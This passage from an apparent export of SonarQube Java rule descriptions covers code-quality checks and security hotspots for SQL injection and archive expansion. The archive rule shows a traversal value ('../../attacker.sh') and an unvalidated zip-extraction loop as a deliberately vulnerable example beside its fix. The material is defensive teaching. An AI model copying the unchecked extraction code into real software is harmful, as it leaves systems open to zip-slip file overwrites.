  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'hibernate', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2016-12-13T12:12:49+0100,"<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",squid:S3776,java,Java,"<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",Cognitive Complexity of methods should not be too high,"[{'key': 'Threshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '15', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2017-06-02T13:36:45+0200,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>",squid:S2757,java,Java,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>","""=+"" should not be used instead of ""+=""",[],MAJOR,[],BUG
2017-06-02T13:36:45+0200,"<p>There's no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.
Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>
is expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(new String[] { ""s1"", ""s2""});  // Noncompliant: unnecessary
  doTheThing(new String[12]);  // Compliant
  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous
  // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(""s1"", ""s2"");
  doTheThing(new String[12]);
  doTheOtherThing((Object[]) new String[8]);
   // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>",squid:S3878,java,Java,"<p>There's no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.
Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>
is expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(new String[] { ""s1"", ""s2""});  // Noncompliant: unnecessary
  doTheThing(new String[12]);  // Compliant
  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous
  // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(""s1"", ""s2"");
  doTheThing(new String[12]);
  doTheOtherThing((Object[]) new String[8]);
   // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>",Arrays should not be created for varargs parameters,[],MINOR,['clumsy'],CODE_SMELL
2018-11-30T10:12:37+0100,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Validate the full path of the extracted file against the full path of the directory where files are uncompressed.
    <ul>
      <li> the canonical path of the uncompressed file must start with the canonical path of the directory where files are extracted. </li>
      <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
    </ul> </li>
</ul>
<pre>
String canonicalDirPath = outputDir.getCanonicalPath();
String canonicalDestPath = targetFile.getCanonicalPath();

if (!canonicalDestPath.startsWith(canonicalDirPath + File.separator)) { // Sanitizer
  throw new ArchiverException(""Entry is trying to leave the target dir: "" + zipEntry.getName());
}
</pre>
<ul>
  <li> Stop extracting the archive if any of its entries has been tainted with a directory traversal path. </li>
  <li> Define and control the ratio between compressed and uncompress bytes. </li>
  <li> Define and control the maximum allowed uncompressed file size. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.
  </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
java.util.zip.ZipFile zipFile = new ZipFile(zipFileName);

Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();
while (entries.hasMoreElements()) {
  ZipEntry e = entries.nextElement(); // Questionable
  File f = new File(outputDir, e.getName());
  InputStream input = zipFile.getInputStream(e);
  extractFile(new ZipInputStream(input), outputDir, e.getName());
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when a ZipEntry or a ArchiveEntry:</p>
<ul>
  <li> is declared as a class field </li>
  <li> is a parameter of an abstract method of an <code>interface</code> or <code>abstract</code> class </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",squid:S5042,java,Java,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Validate the full path of the extracted file against the full path of the directory where files are uncompressed.
    <ul>
      <li> the canonical path of the uncompressed file must start with the canonical path of the directory where files are extracted. </li>
      <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
    </ul> </li>
</ul>
<pre>
String canonicalDirPath = outputDir.getCanonicalPath();
String canonicalDestPath = targetFile.getCanonicalPath();

if (!canonicalDestPath.startsWith(canonicalDirPath + File.separator)) { // Sanitizer
  throw new ArchiverException(""Entry is trying to leave the target dir: "" + zipEntry.getName());
}
</pre>
<ul>
  <li> Stop extracting the archive if any of its entries has been tainted with a directory traversal path. </li>
  <li> Define and control the ratio between compressed and uncompress bytes. </li>
  <li> Define and control the maximum allowed uncompressed file size. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.
  </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
java.util.zip.ZipFile zipFile = new ZipFile(zipFileName);

Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();
while (entries.hasMoreElements()) {
  ZipEntry e = entries.nextElement(); // Questionable
  File f = new File(outputDir, e.getName());
  InputStream input = zipFile.getInputStream(e);
  extractFile(new ZipInputStream(input), outputDir, e.getName());
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when a ZipEntry or a ArchiveEntry:</p>
<ul>
  <li> is declared as a class field </li>
  <li> is a parameter of an abstract method of an <code>interface</code> or <code>abstract</code> class </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",Expanding archive files is security-sensitive,[],CRITICAL,"['cert', 'cwe']",SECURITY_HOTSPOT
2016-07-06T12:31:45+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>
<pre>
@Test
public void foo() {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testFoo() {
  // ...
}
</pre>",squid:S3578,java,Java,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>
<pre>
@Test
public void foo() {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testFoo() {
  // ...
}
</pre>",Test methods should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression the test method names are checked against.', 'defaultValue': '^test[A-Z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,"['convention', 'tests']",CODE_SMELL
2015-01-05T09:08:32+0100,"<p>According to Oracle Javadoc:</p>
<blockquote>
  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting
  on an object's monitor without owning the specified monitor.</p>
</blockquote>
<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and
<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  ...
  try {
    ...
    anObject.notify();
    ...
  } catch(IllegalMonitorStateException e) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  ...
  synchronized(anObject) {
    ...
    anObject.notify();
    ...
  }
}
</pre>",squid:S2235,java,Java,"<p>According to Oracle Javadoc:</p>
<blockquote>
  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting
  on an object's monitor without owning the specified monitor.</p>
</blockquote>
<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and
<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  ...
  try {
    ...
    anObject.notify();
    ...
  } catch(IllegalMonitorStateException e) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  ...
  synchronized(anObject) {
    ...
    anObject.notify();
    ...
  }
}
</pre>",IllegalMonitorStateException should not be caught,[],CRITICAL,"['error-handling', 'multi-threading']",CODE_SMELL
2013-08-30T17:20:57+0200,"<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand
which block will catch which exception.</p>",squid:S1141,java,Java,"<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand
which block will catch which exception.</p>",Try-catch blocks should not be nested,[],MAJOR,"['confusing', 'error-handling']",CODE_SMELL
2015-01-05T09:08:32+0100,"<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected. </p>
<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API
:</p>
<ul>
  <li> <code>java.lang.String</code> </li>
  <li> <code>java.lang.Boolean</code> </li>
  <li> <code>java.lang.Integer</code> </li>
  <li> <code>java.lang.Double</code> </li>
  <li> <code>java.lang.Float</code> </li>
  <li> <code>java.lang.Byte</code> </li>
  <li> <code>java.lang.Character</code> </li>
  <li> <code>java.lang.Short</code> </li>
  <li> <code>java.lang.StackTraceElement</code> </li>
  <li> <code>java.time.DayOfWeek</code> </li>
  <li> <code>java.time.Duration</code> </li>
  <li> <code>java.time.Instant</code> </li>
  <li> <code>java.time.LocalDate</code> </li>
  <li> <code>java.time.LocalDateTime</code> </li>
  <li> <code>java.time.LocalTime</code> </li>
  <li> <code>java.time.Month</code> </li>
  <li> <code>java.time.MonthDay</code> </li>
  <li> <code>java.time.OffsetDateTime</code> </li>
  <li> <code>java.time.OffsetTime</code> </li>
  <li> <code>java.time.Period</code> </li>
  <li> <code>java.time.Year</code> </li>
  <li> <code>java.time.YearMonth</code> </li>
  <li> <code>java.time.ZonedDateTime</code> </li>
  <li> <code>java.math.BigInteger</code> </li>
  <li> <code>java.math.BigDecimal</code> </li>
  <li> <code>java.util.Optional</code> </li>
</ul>
<p>and also on <code>ConcurrentMap.putIfAbsent</code> calls ignored return value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void handle(String command){
  command.toLowerCase(); // Noncompliant; result of method thrown away
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void handle(String command){
  String formattedCommand = command.toLowerCase();
  ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when both these conditions are met:</p>
<ul>
  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>
  <li> The method name starts with ""parse"", ""format"", ""decode"" or ""valueOf"" or the method is <code>String.getBytes(Charset)</code>. </li>
</ul>
<pre>
private boolean textIsInteger(String textToCheck) {

    try {
        Integer.parseInt(textToCheck, 10); // OK
        return true;
    } catch (NumberFormatException ignored) {
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.7 - The value returned by a function having non-void return type shall be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9YIRAQ"">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9gEqAQ"">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>",squid:S2201,java,Java,"<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected. </p>
<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API
:</p>
<ul>
  <li> <code>java.lang.String</code> </li>
  <li> <code>java.lang.Boolean</code> </li>
  <li> <code>java.lang.Integer</code> </li>
  <li> <code>java.lang.Double</code> </li>
  <li> <code>java.lang.Float</code> </li>
  <li> <code>java.lang.Byte</code> </li>
  <li> <code>java.lang.Character</code> </li>
  <li> <code>java.lang.Short</code> </li>
  <li> <code>java.lang.StackTraceElement</code> </li>
  <li> <code>java.time.DayOfWeek</code> </li>
  <li> <code>java.time.Duration</code> </li>
  <li> <code>java.time.Instant</code> </li>
  <li> <code>java.time.LocalDate</code> </li>
  <li> <code>java.time.LocalDateTime</code> </li>
  <li> <code>java.time.LocalTime</code> </li>
  <li> <code>java.time.Month</code> </li>
  <li> <code>java.time.MonthDay</code> </li>
  <li> <code>java.time.OffsetDateTime</code> </li>
  <li> <code>java.time.OffsetTime</code> </li>
  <li> <code>java.time.Period</code> </li>
  <li> <code>java.time.Year</code> </li>
  <li> <code>java.time.YearMonth</code> </li>
  <li> <code>java.time.ZonedDateTime</code> </li>
  <li> <code>java.math.BigInteger</code> </li>
  <li> <code>java.math.BigDecimal</code> </li>
  <li> <code>java.util.Optional</code> </li>
</ul>
<p>and also on <code>ConcurrentMap.putIfAbsent</code> calls ignored return value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void handle(String command){
  command.toLowerCase(); // Noncompliant; result of method thrown away
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void handle(String command){
  String formattedCommand = command.toLowerCase();
  ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when both these conditions are met:</p>
<ul>
  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>
  <li> The method name starts with ""parse"", ""format"", ""decode"" or ""valueOf"" or the method is <code>String.getBytes(Charset)</code>. </li>
</ul>
<pre>
private boolean textIsInteger(String textToCheck) {

    try {
        Integer.parseInt(textToCheck, 10); // OK
        return true;
    } catch (NumberFormatException ignored) {
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.7 - The value returned by a function having non-void return type shall be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9YIRAQ"">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9gEqAQ"">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>",Return values from functions without side effects should not be ignored,[],MAJOR,"['cert', 'misra']",BUG
2018-11-12T11:11:26+0100,"<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization
stream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>
constructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>
<p>When you're trying to read your object(s) back from the file, only the first one will be read successfully, and a
<code>StreamCorruptedException</code> will be thrown after that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode
ObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName);
ObjectOutputStream out = new ObjectOutputStream(fos);
</pre>",squid:S2689,java,Java,"<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization
stream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>
constructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>
<p>When you're trying to read your object(s) back from the file, only the first one will be read successfully, and a
<code>StreamCorruptedException</code> will be thrown after that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode
ObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName);
ObjectOutputStream out = new ObjectOutputStream(fos);
</pre>",Files opened in append mode should not be used with ObjectOutputStream,[],BLOCKER,['serialization'],BUG
2016-08-04T14:31:39+0200,"<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a
<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>
<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testMethod() {
  try {
            // Some code
  } catch (MyException e) {
    Assert.fail(e.getMessage());  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testMethod() throws MyException {
    // Some code
}
</pre>",squid:S3658,java,Java,"<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a
<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>
<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testMethod() {
  try {
            // Some code
  } catch (MyException e) {
    Assert.fail(e.getMessage());  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testMethod() throws MyException {
    // Some code
}
</pre>",Unit tests should throw exceptions,[],MINOR,"['clumsy', 'error-handling', 'tests']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from
the input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been
reached, the value -1 is returned.</p>
<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two's complement integer. It has a minimum value of -128 and a maximum
value of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>
primitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied
}
</pre>",squid:S4517,java,Java,"<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from
the input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been
reached, the value -1 is returned.</p>
<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two's complement integer. It has a minimum value of -128 and a maximum
value of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>
primitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied
}
</pre>",InputSteam.read() implementation should not return a signed byte,[],MAJOR,[],BUG
2016-01-27T12:14:23+0100,"<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as ""ignoring"". The
throwing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact
that the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up
the method's state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a
single-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -
probably without finishing its task.</p>
<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>
<blockquote>
  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) { // Noncompliant; logging is not enough
    LOGGER.log(Level.WARN, ""Interrupted!"", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) {
    LOGGER.log(Level.WARN, ""Interrupted!"", e);
    // Restore interrupted state...
    Thread.currentThread().interrupt();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> <a href=""https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1"">Dealing with InterruptedException</a> </li>
</ul>",squid:S2142,java,Java,"<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as ""ignoring"". The
throwing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact
that the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up
the method's state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a
single-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -
probably without finishing its task.</p>
<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>
<blockquote>
  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) { // Noncompliant; logging is not enough
    LOGGER.log(Level.WARN, ""Interrupted!"", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) {
    LOGGER.log(Level.WARN, ""Interrupted!"", e);
    // Restore interrupted state...
    Thread.currentThread().interrupt();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> <a href=""https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1"">Dealing with InterruptedException</a> </li>
</ul>","""InterruptedException"" should not be ignored",[],MAJOR,"['cwe', 'error-handling', 'multi-threading']",BUG
2018-11-12T11:11:26+0100,"<p>By definition, primitive types are not Objects and so they can't be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>
on primitive types adds confusion and is useless.</p>
<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,
int, long, float, double, boolean, char.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
boolean isFoo() {
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean isFoo() {
 ...
}
</pre>",squid:S4682,java,Java,"<p>By definition, primitive types are not Objects and so they can't be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>
on primitive types adds confusion and is useless.</p>
<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,
int, long, float, double, boolean, char.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
boolean isFoo() {
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
